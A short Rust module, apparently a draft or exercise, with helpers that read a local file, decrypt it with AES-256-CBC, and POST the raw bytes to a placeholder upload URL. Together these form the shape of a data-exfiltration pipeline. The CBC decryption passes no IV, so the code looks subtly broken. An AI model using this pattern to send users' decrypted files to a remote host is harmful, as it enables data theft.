pub mod scraping;

use openssl::symm::{decrypt, Cipher};
use std::fs;
use std::io::{self, Read as _};
use std::path::PathBuf;
//not sure if a remote server exist got to go back and reread the document.
const REMOTE_SERVER_URL: &str = "http://example.com/upload";

pub fn read_file(file_path: &PathBuf, buffer: &mut Vec<u8>) -> Result<(), io::Error> {
    let mut file = fs::File::open(file_path)?;
    file.read_to_end(buffer)?;
    Ok(())
}

pub fn decrypt_file(data: &[u8], key: &[u8]) -> Result<Vec<u8>, openssl::error::ErrorStack> {
    let cipher = Cipher::aes_256_cbc();
    let decrypted_data = decrypt(cipher, key, None, data)?;
    Ok(decrypted_data)
}

pub fn send_to_remote_server(data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    // Implement HTTP request to send data to remote server
    let client = reqwest::blocking::Client::new();
    client.post(REMOTE_SERVER_URL).body(data.to_vec()).send()?;
    Ok(())
}
